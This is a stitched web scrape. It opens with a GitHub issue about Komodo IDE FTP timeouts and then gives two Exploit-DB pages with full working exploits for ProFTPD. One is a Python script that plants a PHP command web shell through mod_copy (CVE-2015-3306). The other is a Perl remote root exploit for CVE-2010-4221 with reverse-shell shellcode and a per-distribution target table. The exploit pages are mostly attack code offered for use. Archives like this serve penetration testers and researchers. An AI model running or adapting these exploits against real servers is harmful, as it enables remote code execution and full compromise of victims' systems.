220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)Linux version timeouts when trying connect to FTP server. · Issue #3126 · Komodo/KomodoEdit · GitHub
Skip to content
Why GitHub?
Features →
Code review
Project management
Integrations
Actions
Package registry
Team management
Social coding
Documentation
Code hosting
Customer stories →
Security →
Enterprise
Explore
Explore GitHub →
Learn & contribute
Topics
Collections
Trending
Learning Lab
Open source guides
Connect with others
Events
Community forum
GitHub Education
Marketplace
Pricing
Plans →
Compare plans
Contact Sales
Nonprofit →
Education →
In this repository
All GitHub
↵
Jump to
↵
No suggested jump to results
In this repository
All GitHub
↵
Jump to
↵
In this repository
All GitHub
↵
Jump to
↵
Sign in
Sign up
Watch
85
Star
1,071
Fork
233
Komodo/KomodoEdit
Code
Issues
1,101
Pull requests
25
Projects
0
Wiki
Security
Insights
Dismiss
Track tasks and feature requests
Join 36 million developers who use GitHub
issues to help identify, assign, and keep track of the features and
bug fixes your projects need.
Sign up for free
See pricing for teams and enterprises
New issue
Have a question about this project? Sign up for a free GitHub account to open an issue and contact its maintainers and the community.
Pick a username
Email Address
Password
Sign up for GitHub
By clicking “Sign up for GitHub”, you agree to our terms of service and
privacy statement. We’ll occasionally send you account related emails.
Already on GitHub?
Sign in
to your account
Linux version timeouts when trying connect to FTP server.
#3126
Open
edwardjong2
opened this issue
Sep 19, 2017
· 1 comment
Open
Linux version timeouts when trying connect to FTP server.
#3126
edwardjong2
opened this issue
Sep 19, 2017
· 1 comment
Comments
Assignees
th3coop
Labels
Type: Bug
Projects
None yet
Milestone
11.x.x
3 participants
Copy link
Quote reply
edwardjong2
commented
Sep 19, 2017
•
edited
Short Summary
Linux version timeouts when trying connect to FTP server.
Steps to Reproduce
1 Click on Preference in the middle of the screen.
2 Click on Servers and enter the credentials for ftps.activatestate.com
3 Click on the hamburger menu and select Open->Remote File
4 In Open File, select the ‘Test’ Server
Expected results
1 The files from the 'Test Server' should be accessible.
Actual results
1 The Komodo screen will darken.
2 6 The Komodo will display the following JavaScript Application error message:
Error: ‘timed out’
Platform Information
Komodo IDE, version 11.0.0 build 90667, platform linux-x86_64.
Built on Fri Sep 15 15:48:05 2017.
Ubuntu 16.04 LTS
Additional Information
pystderr.log.txt
There is no problem when using ftp to get to the ftp server.
$ ftp ftps.activestate.com
Connected to ftps.activestate.com.
220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
Name (ftps.activestate.com:edwardj): qa
331 Password required for qa
Password:
230 User qa logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> exit
221 Goodbye.
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Member
Naatan
commented
Sep 19, 2017
The issue here is not the timeout but rather the fact that Komodo's UI is blocked by it.
Naatan
assigned
th3coop
Sep 19, 2017
Naatan
added this to the
11.x.x milestone
Sep 19, 2017
Naatan
added
the
Type: Bug
label
Sep 19, 2017
Sign up for free
to join this conversation on GitHub.
Already have an account?
Sign in to comment
© 2019 GitHub, Inc.
Terms
Privacy
Security
Status
Help
Contact GitHub
Pricing
API
Training
Blog
About
You can’t perform that action at this time.
You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution
Exploit Database
Exploits
GHDB
Papers
Shellcodes
Search EDB
SearchSploit Manual
Submissions
Online Training
PWK
Penetration Testing with Kali
AWAE
Advanced Web Attacks
WiFu
Wireless Attacks
Offsec Resources
Stats
About Us
About Exploit-DB
Exploit-DB History
FAQ
Search
GET CERTIFIED
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution
EDB-ID:
36803
CVE:
2015-3306
EDB Verified:
Author:
R-73eN
Type:
remote
Exploit:
/
Platform:
Linux
Date:
2015-04-21
Vulnerable App:
Become a Certified Penetration Tester
Enroll in
Penetration Testing with Kali Linux
, the course
required to become an
Offensive Security Certified Professional (OSCP)
GET CERTIFIED
# Title: ProFTPd 1.3.5 Remote Command Execution
# Date : 20/04/2015
# Author: R-73eN
# Software: ProFTPd 1.3.5 with mod_copy
# Tested : Kali Linux 1.06
# CVE : 2015-3306
# Greetz to Vadim Melihow for all the hard work .
import socket
import sys
import requests
#Banner
banner = ""
banner += "
___
__
____
_
_
\n"
banner +=" |_ _|_ __
/ _| ___
/ ___| ___ _ __
/ \
| |
\n"
banner +="
| || '_ \| |_ / _ \| |
_ / _ \ '_ \
/ _ \ | |
\n"
banner +="
| || | | |
_| (_) | |_| |
__/ | | |
/ ___ \| |___ \n"
banner +=" |___|_| |_|_|
\___/ \____|\___|_| |_| /_/
\_\_____|\n\n"
print banner
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
if(len(sys.argv) < 4):
print '\n Usage : exploit.py server directory cmd'
else:
server = sys.argv[1] #Vulnerable Server
directory = sys.argv[2] # Path accessible from web .....
cmd = sys.argv[3] #PHP payload to be executed
evil = '<?php system("' + cmd + '") ?>'
s.connect((server, 21))
s.recv(1024)
print '[ + ] Connected to server [ + ] \n'
s.send('site cpfr /etc/passwd')
s.recv(1024)
s.send('site cpto ' + evil)
s.recv(1024)
s.send('site cpfr /proc/self/fd/3')
s.recv(1024)
s.send('site cpto ' + directory + 'infogen.php')
s.recv(1024)
s.close()
print '[ + ] Payload sended [ + ]\n'
print '[ + ] Executing Payload [ + ]\n'
r = requests.get('http://' + server + '/infogen.php') #Executing PHP payload through HTTP
if (r.status_code == 200):
print '[ * ] Payload Executed Succesfully [ * ]'
else:
print ' [ - ] Error : ' + str(r.status_code) + ' [ - ]'
print '\n http://infogen.al/'
Tags:
Advisory/Source:
Link
Downloads
Certifications
Training
Professional Services
Kali Linux
OSCP
Penetration Testing with Kali Linux (PWK)
Penetration Testing
Kali NetHunter
OSWP
Advanced Web Attacks and Exploitation (AWAE)
Advanced Attack Simulation
Kali Linux Revealed Book
OSCE
Offensive Security Wireless Attacks (WiFu)
Application Security Assessment
OSEE
Cracking the Perimeter (CTP)
OSWE
Metasploit Unleashed (MSFU)
KLCP
Free Kali Linux Training
Downloads
Kali Linux
Kali NetHunter
Kali Linux Revealed Book
Certifications
OSCP
OSWP
OSCE
OSEE
OSWE
KLCP
Training
Penetration Testing with Kali Linux (PWK)
Advanced Web Attacks and Exploitation (AWAE)
Offensive Security Wireless Attacks (WiFu)
Cracking the Perimeter (CTP)
Metasploit Unleashed (MSFU)
Free Kali Linux training
Pro Services
Penetration Testing
Advanced Attack Simulation
Application Security Assessment
Exploit Database by Offensive Security
Terms
Privacy
About Us
FAQ
©
Copyright 2019, Exploit Database
About The Exploit Database
×
The Exploit Database is maintained by Offensive Security, an information security training company
that provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is a
non-profit project that is provided as a public service by Offensive Security.
The Exploit Database is a CVE
compliant archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.
The Google Hacking Database (GHDB)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.
The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at DEFCON 13. Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.
After nearly a decade of hard work by the community, Johnny turned the GHDB
over to Offensive Security in November 2010, and it is now maintained as
an extension of the Exploit Database. Today, the GHDB includes searches for
other online search engines such as Bing,
and other online repositories like GitHub,
producing different, yet equally valuable results.
Close
Offensive Security Resources
×
Downloads
Certifications
Training
Services
Kali Linux
OSCP
Penetration Testing with Kali Linux (PWK)
Penetration Testing
Kali NetHunter
OSWP
Offensive Security Wireless Attacks (WiFu)
Advanced Attack Simulation
Kali Linux Revealed Book
OSCE
Cracking the Perimeter (CTP)
Application Security Assessment
OSEE
Advanced Web Attacks (AWAE)
OSWE
Metasploit Unleashed (MSFU)
KLCP
Free Kali Linux training
Close
Search The Exploit Database
×
Title
CVE
Type
dos
local
remote
shellcode
papers
webapps
Platform
AIX
ASP
BSD
BSD_PPC
BSD_x86
BSDi_x86
CGI
FreeBSD
FreeBSD_x86
FreeBSD_x86-64
Generator
Hardware
HP-UX
IRIX
JSP
Linux
Linux_MIPS
Linux_PPC
Linux_SPARC
Linux_x86
Linux_x86-64
MINIX
Multiple
NetBSD_x86
Novell
OpenBSD
OpenBSD_x86
OSX_PPC
OSX
PHP
Plan9
QNX
SCO
SCO_x86
Solaris
Solaris_SPARC
Solaris_x86
Tru64
ULTRIX
Unix
UnixWare
Windows_x86
Windows_x86-64
Windows
ARM
CFM
Netware
SuperH_SH4
Java
BeOS
Immunix
Palm_OS
AtheOS
iOS
Android
XML
Perl
Python
System_z
JSON
ASHX
Ruby
ASPX
macOS
Linux_CRISv32
eZine
Magazine
NodeJS
Alpha
Solaris_MIPS
Lua
Author
Content
Port
14
21
22
23
25
42
49
53
66
69
70
79
80
81
102
105
110
111
113
119
123
135
139
143
161
162
164
383
389
402
406
411
443
444
445
446
502
504
513
514
515
532
548
554
555
617
623
631
655
689
783
787
808
873
888
901
998
1000
1040
1089
1099
1100
1114
1120
1194
1235
1471
1521
1533
1581
1589
1604
1617
1723
1743
1761
1812
1858
1861
1900
1947
2000
2022
2049
2100
2103
2121
2125
2181
2242
2315
2375
2380
2381
2401
2480
2525
2640
2810
2812
2947
2954
2990
3000
3030
3050
3052
3128
3129
3181
3200
3217
3306
3333
3378
3460
3465
3500
3535
3632
3690
3790
3814
3817
4000
4002
4070
4081
4105
4111
4322
4343
4434
4501
4555
4592
4661
4750
4848
5000
5060
5061
5080
5081
5093
5151
5180
5247
5250
5272
5308
5432
5466
5554
5555
5600
5655
5666
5800
5803
5814
5858
5900
5984
6066
6070
6080
6082
6101
6112
6129
6502
6503
6660
6667
7001
7002
7070
7071
7080
7100
7144
7210
7272
7290
7426
7443
7510
7547
7649
7770
7777
7778
7787
7879
7902
8000
8001
8002
8004
8008
8020
8022
8023
8028
8030
8080
8081
8082
8088
8090
8181
8300
8400
8443
8445
8473
8500
8585
8619
8800
8812
8839
8880
8888
9000
9001
9002
9080
9090
9091
9100
9124
9200
9251
9256
9443
9447
9784
9788
9855
9876
9900
9987
9993
9999
10000
10001
10080
10202
10203
10443
10616
11000
11211
11460
12203
12221
12345
12397
12401
13327
13701
13722
13838
16992
18821
18881
19000
19810
19813
20000
20010
20031
20111
20171
22003
23423
25672
26000
27015
27700
28015
30000
30303
31337
32400
32674
32764
34205
37215
37777
37848
38292
40007
41523
44334
46824
48080
49152
50000
50496
52311
52789
52869
52986
53413
54345
54890
55554
55555
56380
57772
58080
62514
Tag
WordPress Core
Metasploit Framework (MSF)
WordPress Plugin
SQL Injection (SQLi)
Cross-Site Scripting (XSS)
File Inclusion (LFI/RFI)
Cross-Site Request Forgery (CSRF)
Denial of Service (DoS)
Code Injection
Command Injection
Authentication Bypass / Credentials Bypass (AB/CB)
Client Side
Use After Free (UAF)
Out Of Bounds
Remote
Local
XML External Entity (XXE)
Integer Overflow
Server-Side Request Forgery (SSRF)
Race Condition
NULL Pointer Dereference
Malware
Buffer Overflow
Heap Overflow
Type Confusion
Object Injection
Bug Report
Console
Pwn2Own
Traversal
Deserialization
Verified
Has App
No Metasploit
SearchProFTPd IAC 1.3.x - Remote Command Execution
Exploit Database
Exploits
GHDB
Papers
Shellcodes
Search EDB
SearchSploit Manual
Submissions
Online Training
PWK
Penetration Testing with Kali
AWAE
Advanced Web Attacks
WiFu
Wireless Attacks
Offsec Resources
Stats
About Us
About Exploit-DB
Exploit-DB History
FAQ
Search
GET CERTIFIED
ProFTPd IAC 1.3.x - Remote Command Execution
EDB-ID:
15449
CVE:
2010-4221
EDB Verified:
Author:
kingcope
Type:
remote
Exploit:
/
Platform:
Linux
Date:
2010-11-07
Vulnerable App:
Become a Certified Penetration Tester
Enroll in
Penetration Testing with Kali Linux
, the course
required to become an
Offensive Security Certified Professional (OSCP)
GET CERTIFIED
# Exploit Title: ProFTPD IAC Remote Root Exploit
# Date: 7 November 2010
# Author: Kingcope
#
# E-DB Note: If you have issues with this exploit, alter lines 549, 555 and 563.
use IO::Socket;
$numtargets = 13;
@targets =
(
# Plain Stack Smashing
#Confirmed to work
["FreeBSD 8.1 i386, ProFTPD 1.3.3a Server (binary)",# PLATFORM SPEC
"FreeBSD",	# OPERATING SYSTEM
0,			# EXPLOIT STYLE
0xbfbfe000,	# OFFSET START
0xbfbfff00,	# OFFSET END
1029],		# ALIGN
#Confirmed	to work
["FreeBSD 8.0/7.3/7.2 i386, ProFTPD 1.3.2a/e/c Server (binary)",
"FreeBSD",
0,
0xbfbfe000,
0xbfbfff00,
1021],
# Return into Libc
#Confirmed to work
["Debian GNU/Linux 5.0, ProFTPD 1.3.2e Server (Plesk binary)",
"Linux",
1,			# EXPLOIT STYLE
0x0804CCD4,	# write(2) offset
8189,		# ALIGN
0], 		# PADDING
# Confirmed to work
["Debian GNU/Linux 5.0, ProFTPD 1.3.3 Server (Plesk binary)",
"Linux",
1,
0x0804D23C,
4101,
0],
#Confirmed to work
["Debian GNU/Linux 4.0, ProFTPD 1.3.2e Server (Plesk binary)",
"Linux",
1,
0x0804C9A4,
8189,
0],
#Confirmed to work
["Debian Linux Squeeze/sid, ProFTPD 1.3.3a Server (distro binary)",
"Linux",
1,
0x080532D8,
4101,
12],
["SUSE Linux 9.3, ProFTPD 1.3.2e Server (Plesk binary)",
"Linux",
1,
0x0804C9C4,
8189,
0],
["SUSE Linux 10.0/10.3, ProFTPD 1.3.2e Server (Plesk binary)",
"Linux",
1,
0x0804CAA8,
8189,
0],
["SUSE Linux 10.2, ProFTPD 1.3.2e Server (Plesk binary)",
"Linux",
1,
0x0804CBBC,
8189,
0],
["SUSE Linux 11.0, ProFTPD 1.3.2e Server (Plesk binary)",
"Linux",
1,
0x0804CCBC,
8189,
0],
#Confirmed to work
["SUSE Linux 11.1, ProFTPD 1.3.2e Server (Plesk binary)",
"Linux",
1,
0x0804CCE0,
8189,
0],
["SUSE Linux SLES 10, ProFTPD 1.3.2e Server (Plesk binary)",
"Linux",
1,
0x0804CA2C,
8189,
0],
#Confirmed to work
["CentOS 5, ProFTPD 1.3.2e Server (Plesk binary)",
"Linux",
1,
0x0804C290,
8189,
0],
# feel free to add more targets.
);
#freebsd reverse shell port 45295
#setup a netcat on this port ^^
$bsdcbsc =
# setreuid
"\x31\xc0\x31\xc0\x50\x31\xc0\x50\xb0\x7e\x50\xcd\x80".
# connect back :>
"\x31\xc0\x31\xdb\x53\xb3\x06\x53".
"\xb3\x01\x53\xb3\x02\x53\x54\xb0".
"\x61\xcd\x80\x31\xd2\x52\x52\x68".
"\x41\x41\x41\x41\x66\x68\xb0\xef".
"\xb7\x02\x66\x53\x89\xe1\xb2\x10".
"\x52\x51\x50\x52\x89\xc2\x31\xc0".
"\xb0\x62\xcd\x80\x31\xdb\x39\xc3".
"\x74\x06\x31\xc0\xb0\x01\xcd\x80".
"\x31\xc0\x50\x52\x50\xb0\x5a\xcd".
"\x80\x31\xc0\x31\xdb\x43\x53\x52".
"\x50\xb0\x5a\xcd\x80\x31\xc0\x43".
"\x53\x52\x50\xb0\x5a\xcd\x80\x31".
"\xc0\x50\x68\x2f\x2f\x73\x68\x68".
"\x2f\x62\x69\x6e\x89\xe3\x50\x54".
"\x53\x50\xb0\x3b\xcd\x80\x31\xc0".
"\xb0\x01\xcd\x80";
#linux reverse shell port 45295 by bighawk
#setup a netcat on this port ^^
$lnxcbsc =
# setreuid
"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x90\x90\x90".
# connect back :>
"\x6a\x66".
"\x58".
"\x6a\x01".
"\x5b".
"\x31\xc9".
"\x51".
"\x6a\x01".
"\x6a\x02".
"\x89\xe1".
"\xcd\x80".
"\x68\x7f\x7f\x7f\x7f". # IP
"\x66\x68\xb0\xef". # PORT
"\x66\x6a\x02".
"\x89\xe1".
"\x6a\x10".
"\x51".
"\x50".
"\x89\xe1".
"\x89\xc6".
"\x6a\x03".
"\x5b".
"\x6a\x66".
"\x58".
"\xcd\x80".
"\x87\xf3".
"\x6a\x02".
"\x59".
"\xb0\x3f".
"\xcd\x80".
"\x49".
"\x79\xf9".
"\xb0\x0b".
"\x31\xd2".
"\x52".
"\x68\x2f\x2f\x73\x68".
"\x68\x2f\x62\x69\x6e".
"\x89\xe3".
"\x52".
"\x53".
"\x89\xe1".
"\xcd\x80";
sub exploit1 {
for ($counter=$targets[$ttype][3]; $counter < $targets[$ttype][4]; $counter += 250) {
printf("[$target] CURRENT OFFSET = %08x :pP\n", $counter);
$ret = pack("V", $counter);
$align = $targets[$ttype][5];
my $sock = IO::Socket::INET->new(PeerAddr => $target,
PeerPort => 21,
Proto
=> 'tcp');
$stack = "KCOPERULEZKCOPERULEZKC" . $ret . "\x90" x 500 . $shellcode . "A" x 10;
$v = <$sock>;
print $sock "\x00" x $align . "\xff" . $stack . "\n";
close($sock);
}
}
# Linux technique to retrieve a rootshell (C) kingcope 2010
#
# uses write(2) to fetch process memory out of the remote box (you can find the offset using IDA)
# only the write(2) plt entry offset is needed for the exploit to work (and of course the
# align value)
# once the correct write value is given to the exploit it fetches the memory space of proftpd.
# with this information the exploit can find function entries and byte values
# relative to the write(2) address.
# once the memory is read out the exploit does the following to circumvent linux adress space
# randomization:
#
# 1.) calculate mmap64() plt entry
# 2.) seek for assembly instructions in the proftpd memory space relative to write(2)
#
such as pop pop ret instructions
# 3.) call mmap64() to map at address 0x10000000 with protection read,write,execute
# 4.) calculate offset for memcpy() which is later used to construct the shellcode copy routine
# 4.) copy known assembly instructions (which have been found before using the memory read)
#
to address 0x10000000. these instructions will copy the shellcode from ESP to 0x10000100
#
and make use of the memcpy found before
# 5.) actually jump to the shellcode finder
# 6.) once the shellcode has been copied to 0x10000100 jump to it
# 7.) shellcode gets executed and we have our desired root shell.
sub exploit2 {
printf("[$target] %s :pP\n", $targets[$ttype][0]);
$align = $targets[$ttype][4];
$write_offset = $targets[$ttype][3];
$padding = $targets[$ttype][5];
$|=1;
print "align = $align\n";
print "Seeking for write(2)..\n";
#known good write(2) values
#0x0804C290
#0x0804A85C
#0x0804A234
#0x08052830
#080532D8 proftpd-basic_1.3.3a-4_i386
#08052938 proftpd-basic_1.3.2e-4_i386 (ubunutu)
#0804CCD4 psa-proftpd_1.3.2e-debian5.0.build95100504.17_i386 !!
printf "Using write offset %08x.\n", $write_offset;
$k = $write_offset;
$sock = IO::Socket::INET->new(PeerAddr => $target,
PeerPort => 21,
Proto
=> 'tcp');
$sock->sockopt(SO_LINGER, pack("ii", 1, 0));
#$x = <stdin>;
$stack = "KCOPERULEZKCOPERULEZKC". "C" x $padding .
pack("V", $k).
# write
"\xcc\xcc\xcc\xcc".
"\x01\x00\x00\x00".	# fd for write
pack("V", $k). # buffer for write
"\xff\xff\x00\x00";	# length for write
$v = <$sock>;
print $sock "\x00" x $align . "\xff" . $stack . "\n";
vec ($rfd, fileno($sock), 1) = 1;
$timeout = 2;
if (select ($rfd, undef, undef, $timeout) >= 0
&& vec($rfd, fileno($sock), 1))
{
if (read($sock, $buff, 0xffff) == 0xffff) {
printf "\nSUCCESS. write(2) is at %08x\n", $k;
close($sock);
goto lbl1;
}
}
close($sock);
printf "wrong write(2) offset.\n";
exit;
lbl1:
#	Once we're here chances are good that we get the root shell
print "Reading memory from server...\n";
my $sock = IO::Socket::INET->new(PeerAddr => $target,
PeerPort => 21,
Proto
=> 'tcp');
$stack = "KCOPERULEZKCOPERULEZKC" . "C" x $padding .
pack("V", $k).
# write
"\xcc\xcc\xcc\xcc".
"\x01\x00\x00\x00".	# fd for write
pack("V", $k). # buffer for write
"\xff\xff\x0f\x00";	# length for write
$v = <$sock>;
print $sock "\x00" x $align . "\xff" . $stack . "\n";
read($sock, $buff, 0xfffff);
if (($v = index $buff, "\x5E\x5F\x5D") >= 0) {
$pop3ret = $k + $v;
printf "pop pop pop ret located at %08x\n", $pop3ret;
} else {
print "Could not find pop pop pop ret\n";
exit;
}
if (($v = index $buff, "\x83\xC4\x20\x5B\x5E\x5D\xC3") >= 0) {
$largepopret = $k + $v;
printf "large pop ret located at %08x\n", $largepopret;
} else {
print "Could not find pop pop pop ret\n";
exit;
}
if (($v = index $buff, "\xC7\x44\x24\x08\x03\x00\x00\x00\xC7\x04\x24\x00\x00\x00\x00\x89\x44\x24\x04") >= 0) {
$addr1 = $k+$v+23;
$mmap64 = unpack("I", substr($buff, $v+20, 4));
$mmap64 = $addr1 - (0xffffffff-$mmap64);
printf "mmap64 is located at %08x\n", $mmap64;
} else {
if (($v = index $buff, "\x89\x44\x24\x10\xA1\xBC\xA5\x0F\x08\x89\x44\x24\x04\xe8") >= 0) {
$addr1 = $k+$v+17;
$mmap64 = unpack("I", substr($buff, $v+14, 4));
$mmap64 = $addr1 - (0xffffffff-$mmap64);
printf "mmap64 is located at %08x\n", $mmap64;
} else {
print "Could not find mmap64()\n";
exit;
}
}
if (($v = index $buff, "\x8D\x45\xF4\x89\x04\x24\x89\x54\x24\x08\x8B\x55\x08\x89\x54\x24\x04\xE8") >= 0) {
$addr1 = $k+$v+21;
$memcpy = unpack("I", substr($buff, $v+18, 4));
$memcpy = $addr1 - (0xffffffff-$memcpy);
printf "memcpy is located at %08x\n", $memcpy;
} else {
if (($v = index $buff, "\x8B\x56\x10\x89\x44\x24\x08\x89\x54\x24\x04\x8B\x45\xE4\x89\x04\x24\xe8") >= 0) {
$addr1 = $k+$v+21;
$memcpy = unpack("I", substr($buff, $v+18, 4));
$memcpy = $addr1 - (0xffffffff-$memcpy);
printf "memcpy is located at %08x\n", $memcpy;
} else {
if (($v = index $buff, "\x89\x44\x24\x04\xA1\xBC\x9F\x0E\x08\x89\x04\x24") >= 0) {
$addr1 = $k+$v+16;
$memcpy = unpack("I", substr($buff, $v+13, 4));
$memcpy = $addr1 - (0xffffffff-$memcpy);
printf "memcpy is located at %08x\n", $memcpy;
} else {
if (($v = index $buff, "\x89\x7C\x24\x04\x89\x1C\x24\x89\x44\x24\x08") >= 0) {
$addr1 = $k+$v+15;
$memcpy = unpack("I", substr($buff, $v+12, 4));
$memcpy = $addr1 - (0xffffffff-$memcpy);
printf "memcpy is located at %08x\n", $memcpy;
}	 else {
if (($v = index $buff, "\x8B\x55\x10\x89\x74\x24\x04\x89\x04\x24\x89\x54\x24\x08") >= 0) {
$addr1 = $k+$v+18;
$memcpy = unpack("I", substr($buff, $v+15, 4));
$memcpy = $addr1 - (0xffffffff-$memcpy);
printf "memcpy is located at %08x\n", $memcpy;
} else {
print "Could not find memcpy()\n";
exit;
}
}
}
}
}
if (($v = index $buff, "\xfc\x8b") >= 0) {
$byte1 = $k+$v;
printf ("byte1: %08x\n", $byte1);
} else {
print "Could not find a special byte\n";
exit;
}
if (($v = index $buff, "\xf4") >= 0) {
$byte2 = $k+$v;
printf ("byte2: %08x\n", $byte2);
} else {
print "Could not find a special byte\n";
exit;
}
if (($v = index $buff, "\xbf") >= 0) {
$byte3 = $k+$v;
printf ("byte3: %08x\n", $byte3);
} else {
print "Could not find a special byte\n";
exit;
}
if (($v = index $buff, "\x00\x01\x00") >= 0) {
$byte4 = $k+$v;
printf ("byte4: %08x\n", $byte4);
} else {
print "Could not find a special byte\n";
exit;
}
if (($v = index $buff, "\x10") >= 0) {
$byte5 = $k+$v;
printf ("byte5: %08x\n", $byte5);
} else {
print "Could not find a special byte\n";
exit;
}
if (($v = index $buff, "\xB9\x00\x02\x00\x00") >= 0) {
$byte6 = $k+$v;
printf ("byte6: %08x\n", $byte6);
} else {
print "Could not find a special byte\n";
exit;
}
if (($v = index $buff, "\xf3") >= 0) {
$byte7 = $k+$v;
printf ("byte7: %08x\n", $byte7);
} else {
print "Could not find a special byte\n";
exit;
}
if (($v = index $buff, "\xA4") >= 0) {
$byte8 = $k+$v;
printf ("byte8: %08x\n", $byte8);
} else {
print "Could not find a special byte\n";
exit;
}
if (($v = index $buff, "\xeb\xff") >= 0) {
$byte9 = $k+$v;
printf ("byte9: %08x\n", $byte9);
} else {
print "Could not find a special byte\n";
exit;
}
# shellcode copy routine:
#0100740B
FC
CLD
#0100740C
8BF4
MOV ESI,ESP
#0100740E
BF 00010010
MOV EDI,10000100
#01007413
B9 00020000
MOV ECX,200
#01007418
F3:A4
REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[>
#
EB FF 		 JMP +0xFF
# FC 8B
# F4 BF
# 00 01 00
# 10
# B9 00 02 00 00
# F3:A4
# EB FF
# El1Te X-Ploit TechNiqUe (C)
print "Building exploit buffer\n";
$stack = "KCOPERULEZKCOPERULEZKC" . "C" x $padding .
pack("V", $mmap64). # mmap64()
pack("V", $largepopret). # add
esp, 20h; pop; pop
"\x00\x00\x00\x10". # mmap start
"\x00\x10\x00\x00". # mmap size
"\x07\x00\x00\x00". # mmap prot
"\x32\x00\x00\x00". # mmap flags
"\xff\xff\xff\xff". # mmap fd
"\x00\x00\x00\x00". # mmap offset
"\x00\x00\x00\x00". # mmap offset
"\x00\x00\x00\x00".
"\x00\x00\x00\x00".
"\x00\x00\x00\x00".
"\x00\x00\x00\x00".
pack("V", $memcpy). # memcpy()
pack("V", $pop3ret). # pop; pop; pop; retn
"\x00\x00\x00\x10". # destination
pack("V", $byte1). # origin
"\x02\x00\x00\x00". # number of bytes to copy
pack("V", $memcpy). # memcpy()
pack("V", $pop3ret). # pop; pop; pop; retn
"\x02\x00\x00\x10". # destination
pack("V", $byte2). # origin
"\x01\x00\x00\x00". # number of bytes to copy
pack("V", $memcpy). # memcpy()
pack("V", $pop3ret). # pop; pop; pop; retn
"\x03\x00\x00\x10". # destination
pack("V", $byte3). # origin
"\x01\x00\x00\x00". # number of bytes to copy
pack("V", $memcpy). # memcpy()
pack("V", $pop3ret). # pop; pop; pop; retn
"\x04\x00\x00\x10". # destination
pack("V", $byte4). # origin
"\x03\x00\x00\x00". # number of bytes to copy
pack("V", $memcpy). # memcpy()
pack("V", $pop3ret). # pop; pop; pop; retn
"\x07\x00\x00\x10". # destination
pack("V", $byte5). # origin
"\x01\x00\x00\x00". # number of bytes to copy
pack("V", $memcpy). # memcpy()
pack("V", $pop3ret). # pop; pop; pop; retn
"\x08\x00\x00\x10". # destination
pack("V", $byte6). # origin
"\x05\x00\x00\x00". # number of bytes to copy
pack("V", $memcpy). # memcpy()
pack("V", $pop3ret). # pop; pop; pop; retn
"\x0d\x00\x00\x10". # destination
pack("V", $byte7). # origin
"\x01\x00\x00\x00". # number of bytes to copy
pack("V", $memcpy). # memcpy()
pack("V", $pop3ret). # pop; pop; pop; retn
"\x0e\x00\x00\x10". # destination
pack("V", $byte8). # origin
"\x01\x00\x00\x00". # number of bytes to copy
pack("V", $memcpy). # memcpy()
pack("V", $pop3ret). # pop; pop; pop; retn
"\x0f\x00\x00\x10". # destination
pack("V", $byte9). # origin
"\x02\x00\x00\x00". # number of bytes to copy
"\x00\x00\x00\x10". # JUMP TO 0x10000000 rwxp address
"\x90" x 100 . $shellcode . "\x90" x 10;
print "Sending exploit buffer!\n";
my $sock = IO::Socket::INET->new(PeerAddr => $target,
PeerPort => 21,
Proto
=> 'tcp');
$v = <$sock>;
print $sock "\x00" x $align . "\xff" . $stack . "\n";
print "Check your netcat?\n";
while(<$sock>) {
print;
}
}
sub usage() {
print "written by kingcope\n";
print "usage:\n".
"proremote.pl <target ip/host> <your ip> <target type>\n\n";
for ($i=0; $i<$numtargets; $i++) {
print "\t[".$i."]\t". $targets[$i][0]. "\r\n";
}
exit;
}
if ($#ARGV ne 2) { usage; }
$target = $ARGV[0];
$cbip = $ARGV[1];
$ttype = $ARGV[2];
$platform = $targets[$ttype][1];
$style = $targets[$ttype][2];
($a1, $a2, $a3, $a4) = split(//, gethostbyname("$cbip"));
if ($platform eq "FreeBSD") {
$shellcode = $bsdcbsc;
substr($shellcode, 37, 4, $a1 . $a2 . $a3 . $a4);
} else {
if ($platform eq "Linux") {
$shellcode = $lnxcbsc;
substr($shellcode, 31, 4, $a1 . $a2 . $a3 . $a4);
} else {
print "typo ?\n";
exit;
}}
if ($style eq 0) {
exploit1;
} else {
exploit2;
}
print "done.\n";
exit;
Tags:
Advisory/Source:
Link
Downloads
Certifications
Training
Professional Services
Kali Linux
OSCP
Penetration Testing with Kali Linux (PWK)
Penetration Testing
Kali NetHunter
OSWP
Advanced Web Attacks and Exploitation (AWAE)
Advanced Attack Simulation
Kali Linux Revealed Book
OSCE
Offensive Security Wireless Attacks (WiFu)
Application Security Assessment
OSEE
Cracking the Perimeter (CTP)
OSWE
Metasploit Unleashed (MSFU)
KLCP
Free Kali Linux Training
Downloads
Kali Linux
Kali NetHunter
Kali Linux Revealed Book
Certifications
OSCP
OSWP
OSCE
OSEE
OSWE
KLCP
Training
Penetration Testing with Kali Linux (PWK)
Advanced Web Attacks and Exploitation (AWAE)
Offensive Security Wireless Attacks (WiFu)
Cracking the Perimeter (CTP)
Metasploit Unleashed (MSFU)
Free Kali Linux training
Pro Services
Penetration Testing
Advanced Attack Simulation
Application Security Assessment
